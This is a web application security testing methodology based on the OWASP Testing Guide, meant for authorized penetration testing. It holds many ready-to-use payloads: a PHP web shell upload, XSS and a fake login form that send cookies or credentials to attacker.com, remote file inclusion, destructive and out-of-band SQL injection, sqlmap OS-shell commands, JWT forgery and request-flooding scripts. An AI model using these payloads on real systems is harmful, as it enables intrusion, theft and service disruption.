# OWASP Web Application Security Testing Methodology

## Executive Overview

This methodology provides comprehensive web application security testing procedures based on the OWASP Testing Guide v4.2 and aligned with industry best practices. The framework covers all aspects of modern web application security including traditional web apps, Single Page Applications (SPAs), Progressive Web Apps (PWAs), and API-driven architectures.

### Testing Objectives
- Identify security vulnerabilities in web applications
- Validate security controls implementation
- Assess compliance with OWASP Top 10 standards
- Evaluate business logic security
- Test authentication and session management
- Assess data protection mechanisms

## 1. Information Gathering and Reconnaissance

### 1.1 Search Engine Discovery and Reconnaissance (OTG-INFO-001)

#### Manual Testing Procedures
```bash
# Google Dorking Examples
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg
```

#### Automated Tools
- **Google Hacking Database**: Exploit-DB Google Dorks
- **Shodan.io**: Internet-connected device discovery
- **Censys.io**: Certificate and service discovery
- **Have I Been Pwned**: Breach data analysis

#### Evidence Collection
- Screenshot of exposed sensitive information
- Document URLs and file paths discovered
- Record metadata and version information

### 1.2 Fingerprint Web Server (OTG-INFO-002)

#### HTTP Header Analysis
```http
# Server identification headers
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
```

#### Testing Tools
- **Whatweb**: `whatweb -v target.com`
- **Wappalyzer**: Browser extension for technology stack identification
- **Netcraft**: `curl -I https://target.com`
- **Nmap**: `nmap -sV -p 80,443 target.com`

#### Banner Grabbing
```bash
# HTTP banner grabbing
curl -I -s https://target.com | grep -i server
telnet target.com 80
GET / HTTP/1.1
Host: target.com

# HTTPS certificate analysis
openssl s_client -connect target.com:443 -servername target.com
```

### 1.3 Review Webserver Metafiles (OTG-INFO-003)

#### robots.txt Analysis
```bash
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/security.txt
curl https://target.com/.well-known/security.txt
```

#### Common Metafiles to Review
- `/robots.txt` - Search engine directives
- `/sitemap.xml` - Site structure mapping
- `/crossdomain.xml` - Flash cross-domain policy
- `/clientaccesspolicy.xml` - Silverlight policy
- `/.well-known/` - RFC 8615 well-known URIs

### 1.4 Enumerate Applications on Webserver (OTG-INFO-004)

#### Virtual Host Discovery
```bash
# DNS enumeration
dnsrecon -d target.com -t brt
fierce -dns target.com

# Subdomain brute forcing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://FUZZ.target.com -mc 200,301,302,403
```

#### Directory and File Discovery
```bash
# Directory brute forcing
dirb https://target.com /usr/share/dirb/wordlists/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Technology-specific paths
# .NET applications
/bin/, /App_Data/, /App_Code/
# Java applications  
/WEB-INF/, /META-INF/
# PHP applications
/config/, /includes/, /admin/
```

## 2. Configuration and Deployment Management Testing

### 2.1 Test Network Infrastructure Configuration (OTG-CONFIG-001)

#### Network Port Analysis
```bash
# Port scanning
nmap -sS -sV -p- target.com
nmap -sU --top-ports 1000 target.com

# Service enumeration
nmap -sC -sV -p 80,443,8080,8443 target.com
```

#### SSL/TLS Configuration Testing
```bash
# SSL Labs API testing
curl -s "https://api.ssllabs.com/api/v3/analyze?host=target.com"

# testssl.sh comprehensive testing
./testssl.sh --full target.com

# Specific cipher testing
nmap --script ssl-enum-ciphers -p 443 target.com
```

### 2.2 Test Application Platform Configuration (OTG-CONFIG-002)

#### Web Server Configuration
```bash
# HTTP Methods testing
curl -X OPTIONS https://target.com -v
curl -X TRACE https://target.com -v
curl -X PUT https://target.com/test.txt -d "test content" -v

# Default files and directories
curl https://target.com/phpinfo.php
curl https://target.com/server-status
curl https://target.com/admin/
```

#### Sample Configuration Files
```nginx
# Nginx security headers
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options DENY;
add_header X-XSS-Protection "1; mode=block";
add_header Content-Security-Policy "default-src 'self'";
```

### 2.3 Test File Extensions Handling (OTG-CONFIG-003)

#### File Upload Testing
```bash
# Test various file extensions
.jsp, .jspx, .php, .php3, .php4, .php5, .phtml
.asp, .aspx, .ascx, .ashx, .asmx
.cfm, .cfml, .cfc
.pl, .py, .rb
.exe, .bat, .cmd, .com, .pif, .scr
```

#### MIME Type Bypass Testing
```http
# File upload with manipulated Content-Type
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

## 3. Identity Management Testing

### 3.1 Test Role Definitions (OTG-IDENT-001)

#### Role-Based Access Control Testing
```http
# Test different user roles
GET /admin/users HTTP/1.1
Cookie: sessionid=user_session

GET /admin/users HTTP/1.1  
Cookie: sessionid=admin_session

GET /admin/users HTTP/1.1
Cookie: sessionid=manager_session
```

#### Privilege Escalation Testing
- Test horizontal privilege escalation (same role, different user)
- Test vertical privilege escalation (lower to higher privilege)
- Test role inheritance and delegation mechanisms

### 3.2 Test User Registration Process (OTG-IDENT-002)

#### Registration Bypass Testing
```http
# Duplicate registration testing
POST /register HTTP/1.1
Content-Type: application/json

{
    "username": "admin",
    "email": "test@attacker.com", 
    "password": "password123"
}
```

#### Account Enumeration
```bash
# Username enumeration via registration
curl -X POST https://target.com/register \
  -d "username=admin&email=test@test.com&password=pass" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Response time analysis for existing users
# Different error messages for existing vs non-existing users
```

### 3.3 Test Account Provisioning Process (OTG-IDENT-003)

#### Account Creation Validation
- Test account creation workflows
- Validate email verification processes  
- Test account activation mechanisms
- Assess default privileges for new accounts

## 4. Authentication Testing

### 4.1 Test for Credentials Transported over Encrypted Channel (OTG-AUTHN-001)

#### HTTPS Enforcement Testing
```bash
# Test HTTP to HTTPS redirection
curl -I http://target.com/login

# Test login form submission over HTTP
curl -X POST http://target.com/login \
  -d "username=test&password=test" \
  -v
```

#### Mixed Content Analysis
```javascript
// JavaScript to detect mixed content
if (location.protocol !== 'https:') {
    console.log('Page not served over HTTPS');
}

// Check for insecure resources
document.querySelectorAll('*').forEach(function(element) {
    ['src', 'href', 'action'].forEach(function(attr) {
        var value = element.getAttribute(attr);
        if (value && value.startsWith('http://')) {
            console.log('Insecure resource found:', element, attr, value);
        }
    });
});
```

### 4.2 Test for Default Credentials (OTG-AUTHN-002)

#### Common Default Credentials
```bash
# Web application defaults
admin:admin, admin:password, admin:123456
administrator:administrator, root:root, guest:guest
demo:demo, test:test, user:user

# Database defaults
sa:sa, root:root, postgres:postgres
oracle:oracle, mysql:mysql

# Application-specific defaults (check vendor documentation)
```

#### Automated Testing Tools
- **Hydra**: `hydra -L users.txt -P passwords.txt target.com http-post-form`
- **Medusa**: `medusa -h target.com -U users.txt -P passwords.txt -M http`
- **Burp Suite Intruder**: Automated credential testing

### 4.3 Test for Weak Lock Out Mechanism (OTG-AUTHN-003)

#### Account Lockout Testing
```python
# Python script for lockout testing
import requests
import time

def test_lockout(url, username, password, attempts=10):
    for i in range(attempts):
        response = requests.post(url, data={
            'username': username,
            'password': password + str(i)
        })
        print(f"Attempt {i+1}: Status {response.status_code}")
        if "locked" in response.text.lower():
            print(f"Account locked after {i+1} attempts")
            break
        time.sleep(1)
```

#### Lockout Bypass Techniques
- IP address rotation
- Distributed authentication attacks
- User enumeration via lockout timing
- Account lockout DoS testing

### 4.4 Test for Bypassing Authentication Schema (OTG-AUTHN-004)

#### Direct Object Reference
```http
# Bypass login by direct URL access
GET /dashboard HTTP/1.1
Host: target.com

# Parameter manipulation
GET /login?authenticated=true HTTP/1.1
GET /login?role=admin HTTP/1.1
```

#### SQL Injection Authentication Bypass
```sql
-- SQL injection payloads for authentication bypass
admin' --
admin' /*
' OR '1'='1' --
' OR '1'='1' /*
admin'/**/OR/**/1=1/**/--
```

#### HTTP Parameter Pollution
```http
# Parameter pollution testing
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=user&password=wrong&username=admin&password=admin
```

## 5. Authorization Testing

### 5.1 Test Directory Traversal File Include (OTG-AUTHZ-001)

#### Path Traversal Testing
```bash
# Basic path traversal
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoding
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding  
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

#### File Inclusion Testing
```php
# Local File Inclusion (LFI)
http://target.com/index.php?page=../../../etc/passwd
http://target.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php

# Remote File Inclusion (RFI) 
http://target.com/index.php?page=http://attacker.com/shell.php
http://target.com/index.php?page=ftp://attacker.com/shell.php
```

### 5.2 Test for Bypassing Authorization Schema (OTG-AUTHZ-002)

#### Horizontal Privilege Escalation
```http
# Access other user's data
GET /profile?id=123 HTTP/1.1
Cookie: sessionid=user456_session

GET /api/users/123/orders HTTP/1.1
Authorization: Bearer user456_token
```

#### Vertical Privilege Escalation
```http
# Access admin functionality with user privileges
GET /admin/users HTTP/1.1
Cookie: sessionid=regular_user_session

POST /admin/users/delete HTTP/1.1
Cookie: sessionid=regular_user_session
Content-Type: application/json
{"userId": 789}
```

### 5.3 Test for Privilege Escalation (OTG-AUTHZ-003)

#### Parameter Manipulation
```http
# Role parameter manipulation
POST /updateProfile HTTP/1.1
Content-Type: application/json
Cookie: sessionid=user_session

{
    "username": "user123",
    "email": "user@test.com",
    "role": "admin"
}
```

#### JWT Token Manipulation
```python
# JWT token privilege escalation
import jwt
import base64

# Decode JWT token
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
decoded = jwt.decode(token, verify=False)
print(decoded)

# Modify claims
decoded['role'] = 'admin'
decoded['permissions'] = ['read', 'write', 'admin']

# Re-encode (if key is known or none algorithm)
new_token = jwt.encode(decoded, key='', algorithm='none')
```

## 6. Session Management Testing

### 6.1 Test for Session Management Schema (OTG-SESS-001)

#### Session Cookie Analysis
```http
# Session cookie security analysis
Set-Cookie: JSESSIONID=ABC123; Path=/; HttpOnly; Secure; SameSite=Strict
Set-Cookie: session=XYZ789; Domain=.target.com; Expires=Wed, 09 Jun 2021 10:18:14 GMT
```

#### Session Attributes Testing
- **HttpOnly**: Prevents XSS cookie theft
- **Secure**: HTTPS-only transmission
- **SameSite**: CSRF protection
- **Domain**: Cookie scope validation
- **Path**: Access path restrictions

### 6.2 Test for Cookies Attributes (OTG-SESS-002)

#### Cookie Security Testing
```bash
# Cookie analysis with curl
curl -I https://target.com/login -c cookies.txt
cat cookies.txt

# JavaScript cookie access testing
document.cookie  # Should be empty if HttpOnly is set
```

#### Missing Security Attributes
```javascript
// Test for missing HttpOnly
if (document.cookie.includes('sessionid')) {
    console.log('Session cookie accessible via JavaScript - Missing HttpOnly');
}

// Test for missing Secure flag over HTTPS
if (location.protocol === 'https:' && document.cookie.includes('Secure')) {
    console.log('Cookie security attributes properly set');
} else {
    console.log('Missing Secure flag on HTTPS connection');
}
```

### 6.3 Test for Session Fixation (OTG-SESS-003)

#### Session Fixation Testing
```http
# Step 1: Get session ID before authentication
GET /login HTTP/1.1
Host: target.com
# Response: Set-Cookie: SESSIONID=attacker_controlled_id

# Step 2: Use pre-set session ID for login
POST /login HTTP/1.1  
Host: target.com
Cookie: SESSIONID=attacker_controlled_id
Content-Type: application/x-www-form-urlencoded

username=victim&password=victim_password

# Step 3: Check if session ID remains the same after authentication
```

### 6.4 Test for Exposed Session Variables (OTG-SESS-004)

#### Session Variable Exposure
```bash
# Check for session data in URLs
grep -r "sessionid\|session_token\|auth_token" access.logs

# Check for session data in referrer headers
curl -H "Referer: https://target.com/page?sessionid=123" https://external-site.com
```

#### Session Storage Testing
```javascript
// Check client-side session storage
console.log('sessionStorage:', sessionStorage);
console.log('localStorage:', localStorage);

// Look for sensitive data in storage
for (let i = 0; i < sessionStorage.length; i++) {
    let key = sessionStorage.key(i);
    console.log(key, sessionStorage.getItem(key));
}
```

## 7. Input Validation Testing

### 7.1 Test for Reflected Cross Site Scripting (OTG-INPVAL-001)

#### Basic XSS Payloads
```html
<!-- Basic XSS testing -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Event handler XSS -->
" onmouseover="alert('XSS')" "
' onclick='alert("XSS")' '

<!-- JavaScript protocol -->
javascript:alert('XSS')
```

#### Advanced XSS Techniques
```javascript
// Filter bypass techniques
<ScRiPt>alert('XSS')</ScRiPt>
<script>al\u0065rt('XSS')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

// DOM-based XSS
location.hash.slice(1)
document.referrer
window.name
```

#### XSS Testing Automation
```bash
# XSStrike for automated XSS testing  
python3 xsstrike.py -u "https://target.com/search?q=FUZZ"

# Dalfox for parameter analysis
dalfox url https://target.com/search?keyword=test
```

### 7.2 Test for Stored Cross Site Scripting (OTG-INPVAL-002)

#### Stored XSS Testing
```html
<!-- Comment/profile field testing -->
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie);
    xhr.send();
</script>

<!-- Image tag with onerror -->
<img src="invalid" onerror="window.location='https://attacker.com/steal?cookie='+document.cookie">
```

#### File Upload XSS
```html
<!-- SVG file with embedded JavaScript -->
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('Stored XSS in SVG')">
  <circle cx="100" cy="100" r="50" fill="red"/>
</svg>
```

### 7.3 Test for HTTP Verb Tampering (OTG-INPVAL-003)

#### HTTP Method Testing
```bash
# Test various HTTP methods
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
    curl -X $method https://target.com/api/users/123 -H "Authorization: Bearer token"
done
```

#### Method Override Testing
```http
# HTTP Method Override headers
POST /api/users/123 HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /api/users/123 HTTP/1.1  
X-Method-Override: PUT
```

### 7.4 Test for HTTP Parameter Pollution (OTG-INPVAL-004)

#### Parameter Pollution Testing
```http
# Multiple parameter values
GET /search?category=electronics&category=books HTTP/1.1

POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=user1&password=pass1&username=admin&password=admin123
```

#### JSON Parameter Pollution
```json
{
    "username": "user1",
    "password": "wrongpass", 
    "username": "admin",
    "password": "admin123"
}
```

### 7.5 Test for SQL Injection (OTG-INPVAL-005)

#### Basic SQL Injection Testing
```sql
-- Error-based SQL injection
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' AND 1=CONVERT(int, (SELECT @@version))--

-- Boolean-based blind SQL injection
' AND 1=1--  (True condition)
' AND 1=2--  (False condition)

-- Time-based blind SQL injection
'; WAITFOR DELAY '00:00:10'--
' OR SLEEP(10)--
```

#### Advanced SQL Injection
```sql
-- Union-based data extraction
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, column_name FROM information_schema.columns--

-- Stacked queries
'; DROP TABLE users; --
'; INSERT INTO users VALUES ('hacker', 'password123'); --

-- Out-of-band SQL injection
'; EXEC master..xp_dirtree '\\attacker.com\share'--
```

#### SQL Injection Automation
```bash
# SQLMap for automated SQL injection testing
sqlmap -u "https://target.com/search?id=1" --dbs
sqlmap -u "https://target.com/search?id=1" --dump-all
sqlmap -u "https://target.com/search?id=1" --os-shell

# Manual testing with Burp Suite
# Use Burp's Intruder with SQL injection payload lists
```

## 8. Testing for Error Handling

### 8.1 Test for Improper Error Handling (OTG-ERR-001)

#### Error Message Analysis
```bash
# Trigger various error conditions
curl https://target.com/nonexistent
curl https://target.com/api/users/99999
curl -X POST https://target.com/api/users -d "invalid json"
```

#### Database Error Extraction
```sql
-- Generate database errors for information disclosure
' AND 1=CONVERT(int, 'string')--  (SQL Server)
' AND 1=CAST('string' AS INTEGER)--  (PostgreSQL)
' AND 1='string'+0--  (MySQL)
```

### 8.2 Test for Stack Traces (OTG-ERR-002)

#### Stack Trace Triggering
```bash
# Trigger application exceptions
curl -X POST https://target.com/upload -F "file=@large_file.zip"
curl https://target.com/api/users/%00%00%00
curl https://target.com/search?q=<script>throw new Error()</script>
```

#### Information Disclosure via Errors
- File paths and directory structure
- Database schema and table names
- Application framework versions
- Internal IP addresses and network topology
- Source code snippets

## 9. Testing for Weak Cryptography

### 9.1 Test for Weak SSL/TLS Ciphers (OTG-CRYPST-001)

#### SSL/TLS Security Assessment
```bash
# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p 443 target.com

# Comprehensive SSL testing
./testssl.sh --full target.com

# Specific protocol testing
openssl s_client -connect target.com:443 -ssl3
openssl s_client -connect target.com:443 -tls1
```

#### Certificate Validation
```bash
# Certificate chain analysis
openssl s_client -connect target.com:443 -showcerts

# Certificate expiration and validity
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -dates -noout
```

### 9.2 Test for Padding Oracle (OTG-CRYPST-002)

#### Padding Oracle Testing
```python
# Padding oracle attack simulation
import requests
import base64

def padding_oracle_test(ciphertext, block_size=16):
    # Modify last byte of ciphertext
    for i in range(256):
        modified = ciphertext[:-1] + bytes([i])
        response = requests.post('https://target.com/decrypt', 
                               data={'ciphertext': base64.b64encode(modified)})
        
        if 'padding error' not in response.text:
            return i
    return None
```

### 9.3 Test for Sensitive Information Sent via Unencrypted Channels (OTG-CRYPST-003)

#### Unencrypted Data Transmission
```bash
# Monitor network traffic for sensitive data
tcpdump -i any -s 0 -A 'port 80 and host target.com'

# Check for credentials in HTTP requests
grep -i "password\|token\|api_key" network_capture.txt
```

## 10. Business Logic Testing

### 10.1 Test Business Logic Data Validation (OTG-BUSLOGIC-001)

#### Input Validation Testing
```http
# Test negative values where positive expected
POST /api/transfer HTTP/1.1
Content-Type: application/json

{
    "from_account": "12345",
    "to_account": "67890", 
    "amount": -1000.00
}
```

#### Boundary Value Testing
```json
{
    "age": -1,
    "age": 0,
    "age": 999,
    "price": 0.00,
    "price": -0.01,
    "quantity": 0,
    "quantity": 999999999
}
```

### 10.2 Test for the Circumvention of Work Flows (OTG-BUSLOGIC-002)

#### Workflow Bypass Testing
```http
# Skip mandatory steps in multi-step process
POST /checkout/step3 HTTP/1.1
# (without completing step1 and step2)

GET /download/premium_content HTTP/1.1
# (without payment verification)
```

#### State Manipulation
```bash
# Manipulate hidden form fields
curl -X POST https://target.com/checkout \
  -d "step=payment&status=completed&verified=true"
```

### 10.3 Test Defenses Against Application Misuse (OTG-BUSLOGIC-003)

#### Rate Limiting Testing
```python
# Automated request flooding
import requests
import threading
import time

def flood_request():
    for i in range(1000):
        requests.post('https://target.com/api/action', json={'data': i})
        time.sleep(0.1)

# Launch multiple threads
for _ in range(10):
    threading.Thread(target=flood_request).start()
```

#### Resource Exhaustion Testing
```http
# Large payload testing
POST /api/upload HTTP/1.1
Content-Type: application/json
Content-Length: 10000000

{"data": "A" * 10000000}
```

## 11. Client-Side Testing

### 11.1 Test for DOM-based Cross Site Scripting (OTG-CLIENT-001)

#### DOM XSS Identification
```javascript
// Common DOM XSS sinks
document.write()
document.writeln()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
Function()
```

#### DOM XSS Testing
```html
<!-- URL fragment-based DOM XSS -->
<script>
document.write(location.hash.slice(1));
</script>

<!-- Testing URL: https://target.com/page.html#<img src=x onerror=alert('DOM XSS')> -->
```

### 11.2 Test for JavaScript Execution (OTG-CLIENT-002)

#### JavaScript Security Testing
```javascript
// Content Security Policy bypass
<script src="https://trusted-cdn.com/jquery.js"></script>
<script>
// Use trusted library to execute malicious code
$('<img src=x onerror=alert("CSP Bypass")>').appendTo('body');
</script>

// postMessage vulnerabilities
window.addEventListener('message', function(e) {
    document.getElementById('target').innerHTML = e.data; // Vulnerable
});
```

### 11.3 Test for HTML Injection (OTG-CLIENT-003)

#### HTML Injection Testing
```html
<!-- Basic HTML injection -->
<h1>Injected Heading</h1>
<iframe src="https://attacker.com"></iframe>

<!-- Form injection -->
<form action="https://attacker.com/steal" method="POST">
<input name="username" placeholder="Re-enter username">
<input type="password" name="password" placeholder="Re-enter password">
<input type="submit" value="Verify">
</form>
```

### 11.4 Test for Client-side URL Redirect (OTG-CLIENT-004)

#### Open Redirect Testing
```bash
# URL parameter manipulation
https://target.com/redirect?url=https://attacker.com
https://target.com/redirect?next=//attacker.com
https://target.com/redirect?return_to=javascript:alert('XSS')

# Bypass filter techniques
https://target.com/redirect?url=https://target.com@attacker.com
https://target.com/redirect?url=https://target.com.attacker.com
```

## 12. API Security Testing

### 12.1 REST API Security Testing

#### Authentication Testing
```bash
# JWT token analysis
curl -H "Authorization: Bearer TOKEN" https://api.target.com/users

# API key testing
curl -H "X-API-Key: KEY" https://api.target.com/data
curl https://api.target.com/data?api_key=KEY
```

#### Rate Limiting and DoS
```python
# API rate limit testing
import requests
import time
import threading

def api_flood():
    for i in range(1000):
        response = requests.get('https://api.target.com/endpoint')
        print(f"Request {i}: {response.status_code}")
        if response.status_code == 429:
            print("Rate limit detected")
            break
```

### 12.2 GraphQL Security Testing

#### GraphQL Query Analysis
```graphql
# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Deeply nested query (DoS)
{
  user(id: "1") {
    posts {
      comments {
        author {
          posts {
            comments {
              # ... continue nesting
            }
          }
        }
      }
    }
  }
}
```

#### GraphQL Injection Testing
```graphql
# SQL injection in GraphQL
{
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

# Authorization bypass
{
  allUsers {  # Should require admin privileges
    name
    email
    password
  }
}
```

## 13. Testing Tools and Automation

### 13.1 Manual Testing Tools

#### Essential Web Security Tools
- **Burp Suite Professional**: Comprehensive web vulnerability scanner
- **OWASP ZAP**: Free security testing proxy
- **Chrome DevTools**: Client-side security analysis
- **Firefox Developer Tools**: Advanced debugging capabilities
- **Postman**: API testing and documentation
- **curl/wget**: Command-line HTTP clients

#### Specialized Testing Tools
```bash
# SQL injection testing
sqlmap -u "https://target.com/search?id=1" --risk=3 --level=5

# XSS testing  
python3 xsstrike.py -u "https://target.com/search?q=FUZZ" --crawl

# Directory brute forcing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,jsp
```

### 13.2 Automated Security Scanning

#### CI/CD Integration
```yaml
# GitHub Actions security pipeline
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: OWASP ZAP Scan
        uses: zaproxy/action-full-scan@v0.4.0
        with:
          target: 'https://staging.target.com'
```

#### Docker Security Scanning
```bash
# OWASP ZAP in Docker
docker run -v $(pwd):/zap/wrk/:rw \
  -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://target.com -x report.xml

# Nikto web scanner
docker run --rm -v $(pwd):/tmp sullo/nikto \
  -h https://target.com -output /tmp/nikto_report.txt
```

## 14. Reporting and Documentation

### 14.1 Executive Summary Template

```markdown
## Executive Summary

### Assessment Overview
- **Target**: [Application Name]
- **Testing Period**: [Start Date] - [End Date]  
- **Testing Methodology**: OWASP Testing Guide v4.2
- **Tester**: [Security Team/Consultant]

### Key Findings Summary
| Severity | Count | Description |
|----------|-------|-------------|
| Critical | X | Immediate risk to business operations |
| High | X | Significant security impact |
| Medium | X | Moderate risk requiring attention |  
| Low | X | Minor security improvements |

### Risk Assessment
- **Overall Risk Level**: [Critical/High/Medium/Low]
- **Business Impact**: [Description of potential business impact]
- **Recommendation Priority**: [Immediate/Urgent/Standard timeline]
```

### 14.2 Technical Finding Template

```markdown
## Finding: [Vulnerability Title]

### Severity
**Risk Level**: [Critical/High/Medium/Low]
**CVSS Score**: [Score] ([Vector String])

### Description
[Technical description of the vulnerability]

### Impact  
[Potential business and technical impact]

### Affected Components
- **URL**: https://target.com/vulnerable/endpoint
- **Parameter**: [parameter name]
- **HTTP Method**: [GET/POST/PUT/DELETE]

### Proof of Concept
```
[Request/Response examples or screenshots]
```

### Remediation
1. [Specific remediation steps]
2. [Additional security measures]
3. [Long-term preventive controls]

### References
- OWASP Top 10 2021: [Relevant category]
- CWE: [Common Weakness Enumeration ID]
- Additional resources: [Links to documentation]
```

### 14.3 Evidence Collection Standards

#### Screenshot Requirements
- Full browser window including URL bar
- Timestamp visible (browser or system)
- Clear demonstration of vulnerability impact
- Before/after comparison when applicable

#### HTTP Request/Response Logs
```http
# Complete request with headers
POST /vulnerable/endpoint HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=abc123

parameter=malicious_payload

# Complete response with headers  
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: reflected=payload

<html>
<script>alert('XSS')</script>
</html>
```

## Quality Assurance Checklist

### Pre-Testing Validation
- [ ] Scope and rules of engagement confirmed
- [ ] Testing environment properly isolated
- [ ] Backup and recovery procedures documented
- [ ] Emergency contact information available
- [ ] Legal authorization obtained and documented

### During Testing
- [ ] All testing activities logged with timestamps
- [ ] Evidence collected following chain of custody
- [ ] Critical findings reported immediately  
- [ ] Testing boundaries respected
- [ ] No production data accessed or modified

### Post-Testing
- [ ] All testing tools and access removed
- [ ] Evidence securely stored and encrypted
- [ ] Findings validated and documented
- [ ] False positives identified and removed
- [ ] Remediation guidance provided
- [ ] Follow-up testing scheduled

---

**Document Version**: 2.0
**Last Updated**: [Current Date]
**Next Review**: [Review Date]
**Approved By**: [Security Team Lead]